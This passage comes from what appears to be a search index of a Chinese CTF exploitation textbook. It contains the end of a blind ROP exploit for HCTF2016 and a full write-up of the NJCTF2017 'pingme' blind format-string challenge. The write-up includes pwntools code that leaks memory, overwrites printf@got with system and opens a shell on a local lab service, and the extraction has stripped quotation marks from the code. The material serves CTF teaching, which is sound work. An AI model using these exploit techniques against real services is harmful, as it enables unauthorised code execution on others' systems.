) \n             addr   -=   1  def   dump_memory ( buf_size ,   stop_addr ,   gadgets_addr ,   puts_plt ,   start_addr ,   end_addr ): \n     pop_rdi    =   gadgets_addr   +   9       # pop rdi; ret \n\n     result   =   \n     while   start_addr     end_addr : \n         #print result.encode( hex ) \n         sleep ( 0.1 ) \n         payload    =   A * buf_size \n         payload   +=   p64 ( pop_rdi ) \n         payload   +=   p64 ( start_addr ) \n         payload   +=   p64 ( puts_plt ) \n         payload   +=   p64 ( stop_addr ) \n         try : \n             p   =   remote ( 127.0.0.1 ,   10001 ) \n             p . recvline () \n             p . sendline ( payload ) \n             data   =   p . recv ( timeout = 0.1 )        # timeout makes sure to recive all bytes \n             if   data   ==   \\n : \n                 data   =   \\x00 \n             elif   data [ - 1 ]   ==   \\n : \n                 data   =   data [: - 1 ] \n             log . info ( leaking: 0x %x  --   %s   %   ( start_addr ,( data   or   ) . encode ( hex ))) \n             result   +=   data \n             start_addr   +=   len ( data ) \n             p . close () \n         except : \n             log . info ( Can t connect ) \n     return   result  def   get_puts_addr ( buf_size ,   stop_addr ,   gadgets_addr ,   puts_plt ,   puts_got ): \n     pop_rdi    =   gadgets_addr   +   9 \n\n     payload    =   A * buf_size \n     payload   +=   p64 ( pop_rdi ) \n     payload   +=   p64 ( puts_got ) \n     payload   +=   p64 ( puts_plt ) \n     payload   +=   p64 ( stop_addr ) \n\n     p   =   remote ( 127.0.0.1 ,   10001 ) \n     p . recvline () \n     p . sendline ( payload ) \n     data   =   p . recvline () \n     data   =   u64 ( data [: - 1 ]   +   \\x00\\x00 ) \n     log . info ( puts address: 0x %x   %   data ) \n     p . close () \n\n     return   data  #buf_size = get_buffer_size()  buf_size   =   72  #stop_addr = get_stop_addr(buf_size)  stop_addr   =   0x4005e5  #gadgets_addr = get_gadgets_addr(buf_size, stop_addr)  gadgets_addr   =   0x40082a  #puts_plt = get_puts_plt(buf_size, stop_addr, gadgets_addr)  puts_plt   =   0x4005e7       # fake puts  #puts_plt = 0x4005f0    # true puts  # dump code section from memory  # and then use Radare2 or IDA Pro to find the got address  #start_addr = 0x400000  #end_addr   = 0x401000  #code_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)  #with open( code.bin ,  wb ) as f:  #   f.write(code_bin)  #   f.close()  puts_got   =   0x00601018  # you can also dump data from memory and get information from .got  #start_addr = 0x600000  #end_addr   = 0x602000  #data_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)  #with open( data.bin ,  wb ) as f:  #    f.write(data_bin)  #    f.close()  # must close ASLR  #puts_addr = get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got)  puts_addr   =   0x7ffff7a90210  # first add your own libc into libc-database: $ ./add /usr/lib/libc-2.26.so  # $ ./find puts 0x7ffff7a90210  # or $ ./find puts 210  # $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570  # $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts  # then you can get the following offset  offset_puts     =   0x000000000006f210  offset_system   =   0x0000000000042010  offset_str_bin_sh   =   0x17aff5  system_addr   =   ( puts_addr   -   offset_puts )   +   offset_system  binsh_addr    =   ( puts_addr   -   offset_puts )   +   offset_str_bin_sh  # get shell  payload    =   A * buf_size  payload   +=   p64 ( gadgets_addr   +   9 )      # pop rdi; ret;  payload   +=   p64 ( binsh_addr )  payload   +=   p64 ( system_addr )  payload   +=   p64 ( stop_addr )  p   =   remote ( 127.0.0.1 ,   10001 )  p . recvline ()  p . sendline ( payload )  p . interactive ()", 
            "title": "Exploit"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/#_3", 
            "text": "Blind Return Oriented Programming (BROP)  Blind Return Oriented Programming (BROP) Attack (1)", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/", 
            "text": "\u9898\u76ee\u590d\u73b0\n\n\nBlind fmt \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790\n\n\nExploit\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u590d\u73b0\n\n\n\u5728 6.1.1 \u4e2d\u6211\u4eec\u770b\u5230\u4e86 blind ROP\uff0c\u8fd9\u4e00\u8282\u4e2d\u5219\u5c06\u770b\u5230 blind fmt\u3002\u5b83\u4eec\u7684\u5171\u540c\u70b9\u662f\u90fd\u6ca1\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u53ea\u63d0\u4f9b ip \u548c\u7aef\u53e3\u3002\n\n\nchecksec \u5982\u4e0b\uff1a\n\n$ checksec -f pingme\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHFORTIFY Fortified Fortifiable  FILE\nNo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No        0               2       pingme\n\n\n\u5173\u95ed ASLR\uff0c\u7136\u540e\u628a\u7a0b\u5e8f\u8fd0\u884c\u8d77\u6765\uff1a\n\n$ socat tcp4-listen:10001,reuseaddr,fork exec:./pingme \n\n\n\n\nBlind fmt \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6211\u4eec\u5df2\u7ecf\u5728 3.3.1 \u4e2d\u8be6\u7ec6\u8bb2\u8fc7\u4e86\uff0cblind fmt \u8981\u6c42\u6211\u4eec\u5728\u6ca1\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c libc.so \u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u597d\u5728\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542f\u4efb\u4f55\u4fdd\u62a4\uff0c\u5229\u7528\u5f88\u76f4\u63a5\u3002\n\n\n\u901a\u5e38\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u79cd\u95ee\u9898\uff0c\u4e00\u79cd\u662f\u5229\u7528\u4fe1\u606f\u6cc4\u9732\u628a\u7a0b\u5e8f\u4ece\u5185\u5b58\u4e2d dump \u4e0b\u6765\uff0c\u53e6\u4e00\u79cd\u662f\u4f7f\u7528 pwntools \u7684 DynELF \u6a21\u5757\uff08\u5173\u4e8e\u8be5\u6a21\u5757\u7684\u4f7f\u7528\u6211\u4eec\u5728\u7ae0\u8282 4.4 \u4e2d\u6709\u8bb2\u8fc7\uff09\u3002\n\n\n\u786e\u8ba4\u6f0f\u6d1e\n\n\n\u9996\u5148\u4f60\u5f53\u7136\u4e0d\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u8fd8\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u6808\u6ea2\u51fa\u7684\u8bdd\u8f93\u5165\u4e00\u6bb5\u957f\u5b57\u7b26\u4e32\uff0c\u4f46\u7a0b\u5e8f\u662f\u5426\u5d29\u6e83\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8bdd\u5c31\u8f93\u5165\u683c\u5f0f\u5b57\u7b26\uff0c\u770b\u8f93\u51fa\u3002\n\n$ nc 127.0.0.1 10001\nPing me\nABCD%7$x\nABCD44434241\n\n\n\u5f88\u660e\u663e\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u800c\u4e14 ABCD \u5728\u7b2c 7 \u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\uff0c\u5b9e\u9645\u4e0a\u5f53\u7136\u4e0d\u4f1a\u8fd9\u4e48\u5de7\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u811a\u672c\u53bb\u679a\u4e3e\u3002\u8fd9\u91cc\u4f7f\u7528 pwntools \u7684 fmtstr \u6a21\u5757\u4e86\uff1a\n\ndef\n \nexec_fmt\n(\npayload\n):\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ninfo\n \n=\n \np\n.\nrecv\n()\n\n    \nreturn\n \ninfo\n\n\nauto\n \n=\n \nFmtStr\n(\nexec_fmt\n)\n\n\noffset\n \n=\n \nauto\n.\noffset\n\n\n\n\n[*] Found format string offset: 7\n\n\n\ndump file\n\n\n\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u5229\u7528\u8be5\u6f0f\u6d1e\u628a\u4e8c\u8fdb\u5236\u6587\u4ef6\u4ece\u5185\u5b58\u4e2d dump \u4e0b\u6765\uff1a\n\ndef\n \ndump_memory\n(\nstart_addr\n,\n \nend_addr\n):\n\n    \nresult\n \n=\n \n\n    \nwhile\n \nstart_addr\n \n \nend_addr\n:\n\n        \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n        \np\n.\nrecvline\n()\n\n        \n#print result.encode(\nhex\n)\n\n        \npayload\n \n=\n \n%9$s.AAA\n \n+\n \np32\n(\nstart_addr\n)\n\n        \np\n.\nsendline\n(\npayload\n)\n\n        \ndata\n \n=\n \np\n.\nrecvuntil\n(\n.AAA\n)[:\n-\n4\n]\n\n        \nif\n \ndata\n \n==\n \n:\n\n            \ndata\n \n=\n \n\\x00\n\n        \nlog\n.\ninfo\n(\nleaking: 0x\n%x\n --\n \n%s\n \n%\n \n(\nstart_addr\n,\n \ndata\n.\nencode\n(\nhex\n)))\n\n        \nresult\n \n+=\n \ndata\n\n        \nstart_addr\n \n+=\n \nlen\n(\ndata\n)\n\n        \np\n.\nclose\n()\n\n    \nreturn\n \nresult\n\n\nstart_addr\n \n=\n \n0x8048000\n\n\nend_addr\n   \n=\n \n0x8049000\n\n\ncode_bin\n \n=\n \ndump_memory\n(\nstart_addr\n,\n \nend_addr\n)\n\n\nwith\n \nopen\n(\ncode.bin\n,\n \nwb\n)\n \nas\n \nf\n:\n\n    \nf\n.\nwrite\n(\ncode_bin\n)\n\n    \nf\n.\nclose\n()\n\n\n\n\u8fd9\u91cc\u6784\u9020\u7684 paylaod \u548c\u524d\u9762\u6709\u70b9\u4e0d\u540c\uff0c\u5b83\u628a\u5730\u5740\u653e\u5728\u4e86\u540e\u9762\uff0c\u662f\u4e3a\u4e86\u9632\u6b62 printf \u7684 \n%s\n \u88ab \n\\x00\n \u622a\u65ad\uff1a\n\npayload\n \n=\n \n%9$s.AAA\n \n+\n \np32\n(\nstart_addr\n)\n\n\n\n\u53e6\u5916 \n.AAA\n\uff0c\u662f\u4f5c\u4e3a\u4e00\u4e2a\u6807\u5fd7\uff0c\u6211\u4eec\u9700\u8981\u7684\u5185\u5b58\u5728 \n.AAA\n \u7684\u524d\u9762\uff0c\u6700\u540e\uff0c\u504f\u79fb\u7531 7 \u53d8\u4e3a 9\u3002\n\n\n\u5728\u6ca1\u6709\u5f00\u542f PIE \u7684\u60c5\u51b5\u4e0b\uff0c32 \u4f4d\u7a0b\u5e8f\u4ece\u5730\u5740 \n0x8048000\n \u5f00\u59cb\uff0c0x1000 \u7684\u5927\u5c0f\u5c31\u8db3\u591f\u4e86\u3002\u5728\u5bf9\u5185\u5b58 \n\\x00\n \u8fdb\u884c leak \u65f6\uff0c\u6570\u636e\u957f\u5ea6\u4e3a\u96f6\uff0c\u76f4\u63a5\u7ed9\u5b83\u8d4b\u503c\u5c31\u53ef\u4ee5\u4e86\u3002\n\n\n\u4e8e\u662f\u5c31\u6210\u4e86\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u65e0 libc \u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5728 r2 \u4e2d\u67e5\u8be2 printf \u7684 got \u5730\u5740\uff1a\n\n[0x08048490]\n is~printf\nvaddr=0x08048400 paddr=0x00000400 ord=002 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.printf                                                                                        \n[0x08048490]\n pd 3 @ 0x08048400\n        :   ;-- imp.printf:                                                                                                                                                           \n        :   0x08048400      ff2574990408   jmp dword [reloc.printf_116] ; 0x8049974                                                                                                   \n        :   0x08048406      6808000000     push 8                      ; 8                                                                                                            \n        `=\n 0x0804840b      e9d0ffffff     jmp 0x80483e0\n\n\n\u5730\u5740\u4e3a \n0x8049974\n\u3002\n\n\nprintf address \n system address\n\n\n\u63a5\u4e0b\u6765\u901a\u8fc7 printf@got \u6cc4\u9732\u51fa printf \u7684\u5730\u5740\uff0c\u8fdb\u884c\u5230\u8fd9\u513f\uff0c\u5c31\u6709\u4e24\u79cd\u65b9\u5f0f\u8981\u8003\u8651\u4e86\uff0c\u5373\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u62ff\u5230 libc\uff0c\u5982\u679c\u80fd\uff0c\u5c31\u5f88\u7b80\u5355\u4e86\u3002\u5982\u679c\u4e0d\u80fd\uff0c\u5c31\u9700\u8981\u4f7f\u7528 DynELF \u8fdb\u884c\u65e0 libc \u7684\u5229\u7528\u3002\n\n\n\u5148\u8bf4\u7b2c\u4e00\u79cd\uff1a\n\ndef\n \nget_printf_addr\n():\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n    \np\n.\nrecvline\n()\n\n    \npayload\n \n=\n \n%9$s.AAA\n \n+\n \np32\n(\nprintf_got\n)\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n.AAA\n)[:\n4\n]\n\n    \nlog\n.\ninfo\n(\nprintf address: \n%s\n \n%\n \ndata\n.\nencode\n(\nhex\n))\n\n    \nreturn\n \ndata\n\n\nprintf_addr\n \n=\n \nget_printf_addr\n()\n\n\n\n\n[*] printf address: 70e6e0f7\n\n\n\u6240\u4ee5 printf \u7684\u5730\u5740\u662f \n0xf7e0e670\n\uff08\u5c0f\u7aef\u5e8f\uff09\uff0c\u4f7f\u7528 libc-database \u67e5\u8be2\u5f97\u5230 libc.so\uff0c\u7136\u540e\u53ef\u4ee5\u5f97\u5230 printf \u548c system \u7684\u76f8\u5bf9\u4f4d\u7f6e\u3002\n\n$ ./find printf 670\nubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)\n/usr/lib32/libc-2.26.so (id local-292a64d65098446389a47cdacdf5781255a95098)\n$ ./dump local-292a64d65098446389a47cdacdf5781255a95098 printf system\noffset_printf = 0x00051670\noffset_system = 0x0003cc50\n\n\n\u7136\u540e\u8ba1\u7b97\u5f97\u5230 printf \u7684\u5730\u5740\uff1a\n\nprintf_addr\n \n=\n \n0xf7e0e670\n\n\noffset_printf\n \n=\n \n0x00051670\n\n\noffset_system\n \n=\n \n0x0003cc50\n\n\nsystem_addr\n \n=\n \nprintf_addr\n \n-\n \n(\noffset_printf\n \n-\n \noffset_system\n)\n\n\n\n\n\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 DynELF \u6a21\u5757\u6765\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff1a\n\ndef\n \nleak\n(\naddr\n):\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n    \np\n.\nrecvline\n()\n\n    \npayload\n \n=\n \n%9$s.AAA\n \n+\n \np32\n(\naddr\n)\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n.AAA\n)[:\n-\n4\n]\n \n+\n \n\\x00\n\n    \nlog\n.\ninfo\n(\nleaking: 0x\n%x\n --\n \n%s\n \n%\n \n(\naddr\n,\n \ndata\n.\nencode\n(\nhex\n)))\n\n    \np\n.\nclose\n()\n\n    \nreturn\n \ndata\n\n\ndata\n \n=\n \nDynELF\n(\nleak\n,\n \n0x08048490\n)\n     \n# Entry point address\n\n\nsystem_addr\n \n=\n \ndata\n.\nlookup\n(\nsystem\n,\n \nlibc\n)\n\n\nprintf_addr\n \n=\n \ndata\n.\nlookup\n(\nprintf\n,\n \nlibc\n)\n\n\nlog\n.\ninfo\n(\nsystem address: 0x\n%x\n \n%\n \nsystem_addr\n)\n\n\nlog\n.\ninfo\n(\nprintf address: 0x\n%x\n \n%\n \nprintf_addr\n)\n\n\n\n\n[*] system address: 0xf7df9c50\n[*] printf address: 0xf7e0e670\n\n\nDynELF \u4e0d\u8981\u6c42\u6211\u4eec\u62ff\u5230 libc.so\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u67e5\u8be2\u4e0d\u5230 libc.so \u7684\u7248\u672c\u4fe1\u606f\uff0c\u8be5\u6a21\u5757\u5c31\u80fd\u53d1\u6325\u5b83\u6700\u5927\u7684\u4f5c\u7528\u3002\n\n\nattack\n\n\n\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u5957\u8def\uff0c\u6211\u4eec\u901a\u8fc7\u4efb\u610f\u5199\u5c06 printf@got \u6307\u5411\u7684\u5185\u5b58\u8986\u76d6\u4e3a system \u7684\u5730\u5740\uff0c\u7136\u540e\u53d1\u9001\u5b57\u7b26\u4e32 \n/bin/sh\n\uff0c\u5c31\u53ef\u4ee5\u5728\u8c03\u7528 \nprintf(\n/bin/sh\n)\n \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528 \nsystem(\n/bin/sh\n)\n\u3002\n\n\n\u7ec8\u6781 payload \u5982\u4e0b\uff0c\u4f7f\u7528 \nfmtstr_payload\n \u51fd\u6570\u6765\u81ea\u52a8\u6784\u9020\uff0c\u5c06\uff1a\n\npayload\n \n=\n \nfmtstr_payload\n(\n7\n,\n \n{\nprintf_got\n:\n \nsystem_addr\n})\n\n\np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n\np\n.\nrecvline\n()\n\n\np\n.\nsendline\n(\npayload\n)\n\n\np\n.\nrecv\n()\n\n\np\n.\nsendline\n(\n/bin/sh\n)\n\n\np\n.\ninteractive\n()\n\n\n\n\u867d\u8bf4\u6709\u8fd9\u6837\u7684\u81ea\u52a8\u5316\u51fd\u6570\u5f88\u65b9\u4fbf\uff0c\u57fa\u672c\u7684\u624b\u5de5\u6784\u9020\u8fd8\u662f\u8981\u61c2\u7684\uff0c\u770b\u4e00\u4e0b\u751f\u6210\u7684 payload \u957f\u4ec0\u4e48\u6837\u5b50\uff1a\n\n[DEBUG] Sent 0x3a bytes:\n    00000000  74 99 04 08  75 99 04 08  76 99 04 08  77 99 04 08  \u2502t\u00b7\u00b7\u00b7\u2502u\u00b7\u00b7\u00b7\u2502v\u00b7\u00b7\u00b7\u2502w\u00b7\u00b7\u00b7\u2502\n    00000010  25 36 34 63  25 37 24 68  68 6e 25 37  36 63 25 38  \u2502%64c\u2502%7$h\u2502hn%7\u25026c%8\u2502\n    00000020  24 68 68 6e  25 36 37 63  25 39 24 68  68 6e 25 32  \u2502$hhn\u2502%67c\u2502%9$h\u2502hn%2\u2502\n    00000030  34 63 25 31  30 24 68 68  6e 0a                     \u25024c%1\u25020$hh\u2502n\u00b7\u2502\n    0000003a\n\n\n\u5f00\u5934\u662f printf@got \u5730\u5740\uff0c\u56db\u4e2a\u5b57\u8282\u5206\u522b\u4f4d\u4e8e\uff1a\n\n0x08049974\n0x08049975\n0x08049976\n0x08049977\n\n\n\u7136\u540e\u662f\u683c\u5f0f\u5b57\u7b26\u4e32 \n%64c%7$hhn%76c%8hhn%67c%9$hhn%24c%10$hhn\n\uff1a\n\n16  + 64 = 80  = 0x50\n80  + 76 = 156 = 0x9c\n156 + 67 = 223 = 0xdf\n233 + 24 = 247 = 0xf7\n\n\n\u5c31\u8fd9\u6837\u5c06 system \u7684\u5730\u5740\u5199\u5165\u4e86\u5185\u5b58\u3002\n\n\nBingo!!!\n\n$ python2 exp.py\n[+] Opening connection to 127.0.0.2 on port 10001: Done\n[*] Switching to interactive mode\n$ whoami\nfirmy\n\n\n\nExploit\n\n\n\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\n# context.log_level = \ndebug\n\n\n\ndef\n \nexec_fmt\n(\npayload\n):\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ninfo\n \n=\n \np\n.\nrecv\n()\n\n    \nreturn\n \ninfo\n\n\n# p = remote(\n127.0.0.1\n, \n10001\n)\n\n\n# p.recvline()\n\n\n# auto = FmtStr(exec_fmt)\n\n\n# offset = auto.offset\n\n\n# p.close()\n\n\n\ndef\n \ndump_memory\n(\nstart_addr\n,\n \nend_addr\n):\n\n    \nresult\n \n=\n \n\n    \nwhile\n \nstart_addr\n \n \nend_addr\n:\n\n        \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n        \np\n.\nrecvline\n()\n\n        \n# print result.encode(\nhex\n)\n\n        \npayload\n \n=\n \n%9$s.AAA\n \n+\n \np32\n(\nstart_addr\n)\n\n        \np\n.\nsendline\n(\npayload\n)\n\n        \ndata\n \n=\n \np\n.\nrecvuntil\n(\n.AAA\n)[:\n-\n4\n]\n\n        \nif\n \ndata\n \n==\n \n:\n\n            \ndata\n \n=\n \n\\x00\n\n        \nlog\n.\ninfo\n(\nleaking: 0x\n%x\n --\n \n%s\n \n%\n \n(\nstart_addr\n,\n \ndata\n.\nencode\n(\nhex\n)))\n\n        \nresult\n \n+=\n \ndata\n\n        \nstart_addr\n \n+=\n \nlen\n(\ndata\n)\n\n        \np\n.\nclose\n()\n\n    \nreturn\n \nresult\n\n\n# start_addr = 0x8048000\n\n\n# end_addr   = 0x8049000\n\n\n# code_bin = dump_memory(start_addr, end_addr)\n\n\n# with open(\ncode.bin\n, \nwb\n) as f:\n\n\n#     f.write(code_bin)\n\n\n#     f.close()\n\n\nprintf_got\n \n=\n \n0x8049974\n\n\n\n## method 1\n\n\ndef\n \nget_printf_addr\n():\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n    \np\n.\nrecvline\n()\n\n    \npayload\n \n=\n \n%9$s.AAA\n \n+\n \np32\n(\nprintf_got\n)\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n.AAA\n)[:\n4\n]\n\n    \nlog\n.\ninfo\n(\nprintf address: \n%s\n \n%\n \ndata\n.\nencode\n(\nhex\n))\n\n    \nreturn\n \ndata\n\n\n# printf_addr = get_printf_addr()\n\n\nprintf_addr\n \n=\n \n0xf7e0e670\n\n\noffset_printf\n \n=\n \n0x00051670\n\n\noffset_system\n \n=\n \n0x0003cc50\n\n\nsystem_addr\n \n=\n \nprintf_addr\n \n-\n \n(\noffset_printf\n \n-\n \noffset_system\n)\n\n\n\n## method 2\n\n\ndef\n \nleak\n(\naddr\n):\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n    \np\n.\nrecvline\n()\n\n    \npayload\n \n=\n \n%9$s.AAA\n \n+\n \np32\n(\naddr\n)\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n.AAA\n)[:\n-\n4\n]\n \n+\n \n\\x00\n\n    \nlog\n.\ninfo\n(\nleaking: 0x\n%x\n --\n \n%s\n \n%\n \n(\naddr\n,\n \ndata\n.\nencode\n(\nhex\n)))\n\n    \np\n.\nclose\n()\n\n    \nreturn\n \ndata\n\n\n# data = DynELF(leak, 0x08048490)     # Entry point address\n\n\n# system_addr = data.lookup(\nsystem\n, \nlibc\n)\n\n\n# printf_addr = data.lookup(\nprintf\n, \nlibc\n)\n\n\n# log.info(\nsystem address: 0x%x\n % system_addr)\n\n\n# log.info(\nprintf address: 0x%x\n % printf_addr)\n\n\n\n## get shell\n\n\npayload\n \n=\n \nfmtstr_payload\n(\n7\n,\n \n{\nprintf_got\n:\n \nsystem_addr\n})\n\n\np\n \n=\n \nremote\n(\n127.0.1.1\n,\n \n10001\n)\n\n\np\n.\nrecvline\n()\n\n\np\n.\nsendline\n(\npayload\n)\n\n\np\n.\nrecv\n()\n\n\np\n.\nsendline\n(\n/bin/sh\n)\n\n\np\n.\ninteractive\n()\n\n\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nLinux\u7cfb\u7edf\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5229\u7528\u7814\u7a76\n\n\n33C3 CTF 2016 -- ESPR", 
            "title": "NJCTF2017 pingme"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/#_1", 
            "text": "\u5728 6.1.1 \u4e2d\u6211\u4eec\u770b\u5230\u4e86 blind ROP\uff0c\u8fd9\u4e00\u8282\u4e2d\u5219\u5c06\u770b\u5230 blind fmt\u3002\u5b83\u4eec\u7684\u5171\u540c\u70b9\u662f\u90fd\u6ca1\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u53ea\u63d0\u4f9b ip \u548c\u7aef\u53e3\u3002  checksec \u5982\u4e0b\uff1a $ checksec -f pingme\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHFORTIFY Fortified Fortifiable  FILE\nNo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No        0               2       pingme \n\u5173\u95ed ASLR\uff0c\u7136\u540e\u628a\u7a0b\u5e8f\u8fd0\u884c\u8d77\u6765\uff1a $ socat tcp4-listen:10001,reuseaddr,fork exec:./pingme", 
            "title": "\u9898\u76ee\u590d\u73b0"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/#blind-fmt", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6211\u4eec\u5df2\u7ecf\u5728 3.3.1 \u4e2d\u8be6\u7ec6\u8bb2\u8fc7\u4e86\uff0cblind fmt \u8981\u6c42\u6211\u4eec\u5728\u6ca1\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c libc.so \u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u597d\u5728\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542f\u4efb\u4f55\u4fdd\u62a4\uff0c\u5229\u7528\u5f88\u76f4\u63a5\u3002  \u901a\u5e38\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u79cd\u95ee\u9898\uff0c\u4e00\u79cd\u662f\u5229\u7528\u4fe1\u606f\u6cc4\u9732\u628a\u7a0b\u5e8f\u4ece\u5185\u5b58\u4e2d dump \u4e0b\u6765\uff0c\u53e6\u4e00\u79cd\u662f\u4f7f\u7528 pwntools \u7684 DynELF \u6a21\u5757\uff08\u5173\u4e8e\u8be5\u6a21\u5757\u7684\u4f7f\u7528\u6211\u4eec\u5728\u7ae0\u8282 4.4 \u4e2d\u6709\u8bb2\u8fc7\uff09\u3002", 
            "title": "Blind fmt \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/#_2", 
            "text": "\u9996\u5148\u4f60\u5f53\u7136\u4e0d\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u8fd8\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u6808\u6ea2\u51fa\u7684\u8bdd\u8f93\u5165\u4e00\u6bb5\u957f\u5b57\u7b26\u4e32\uff0c\u4f46\u7a0b\u5e8f\u662f\u5426\u5d29\u6e83\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8bdd\u5c31\u8f93\u5165\u683c\u5f0f\u5b57\u7b26\uff0c\u770b\u8f93\u51fa\u3002 $ nc 127.0.0.1 10001\nPing me\nABCD%7$x\nABCD44434241 \n\u5f88\u660e\u663e\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u800c\u4e14 ABCD \u5728\u7b2c 7 \u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\uff0c\u5b9e\u9645\u4e0a\u5f53\u7136\u4e0d\u4f1a\u8fd9\u4e48\u5de7\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u811a\u672c\u53bb\u679a\u4e3e\u3002\u8fd9\u91cc\u4f7f\u7528 pwntools \u7684 fmtstr \u6a21\u5757\u4e86\uff1a def   exec_fmt ( payload ): \n     p . sendline ( payload ) \n     info   =   p . recv () \n     return   info  auto   =   FmtStr ( exec_fmt )  offset   =   auto . offset   [*] Found format string offset: 7", 
            "title": "\u786e\u8ba4\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/lab/6.1.2_pwn_njctf2017_pingme/#dump-file", 
            "text": "\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u5229\u7528\u8be5\u6f0f\u6d1e\u628a\u4e8c\u8fdb\u5236\u6587\u4ef6\u4ece\u5185\u5b58\u4e2d dump \u4e0b\u6765\uff1a def   dump_memory ( start_addr ,   end_addr ): \n     result   =   \n     while   start_addr     end_addr : \n         p   =   remote ( 127.0.0.1 ,   10001 ) \n         p . recvline () \n         #print result.encode( hex ) \n         payload   =   %9$s.AAA   +   p32 ( start_addr ) \n         p . sendline ( payload ) \n         data   =   p . recvuntil ( .AAA )[: - 4 ] \n         if   data   ==   : \n             data   =   \\x00 \n         log . info ( leaking: 0x %x  --   %s   %   ( start_addr ,   data . encode ( hex ))) \n         result   +=   data \n         start_addr   +=   len ( data ) \n         p . close () \n     return   result  start_addr   =   0x8048000  end_addr     =   0x8049000  code_bin   =   dump_memory ( start_addr ,   end_addr )  with   open ( code.bin ,   wb )   as   f : \n     f . write ( code_bin ) \n     f . close ()  \n\u8fd9\u91cc\u6784\u9020\u7684 paylaod 